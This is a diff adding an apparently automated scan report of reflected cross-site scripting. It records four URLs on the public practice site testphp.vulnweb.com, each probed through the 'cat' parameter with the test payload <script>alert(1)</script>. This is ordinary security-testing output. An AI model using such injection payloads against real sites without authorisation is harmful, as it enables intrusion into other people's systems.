@@ -1,0 +1,31 @@
+XSS Vulnerability Scan Results (Gemini Analysis)
+===========================================
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+Parameter: cat
+Payload: <script>alert(1)</script>
+Status: Potential XSS Vulnerability
+Analysis: Payload was reflected in the response without proper encoding
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=2
+Parameter: cat
+Payload: <script>alert(1)</script>
+Status: Potential XSS Vulnerability
+Analysis: Payload was reflected in the response without proper encoding
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=3
+Parameter: cat
+Payload: <script>alert(1)</script>
+Status: Potential XSS Vulnerability
+Analysis: Payload was reflected in the response without proper encoding
+-----------------------------
+
+URL: http://testphp.vulnweb.com/listproducts.php?cat=4
+Parameter: cat
+Payload: <script>alert(1)</script>
+Status: Potential XSS Vulnerability
+Analysis: Payload was reflected in the response without proper encoding
+-----------------------------
+
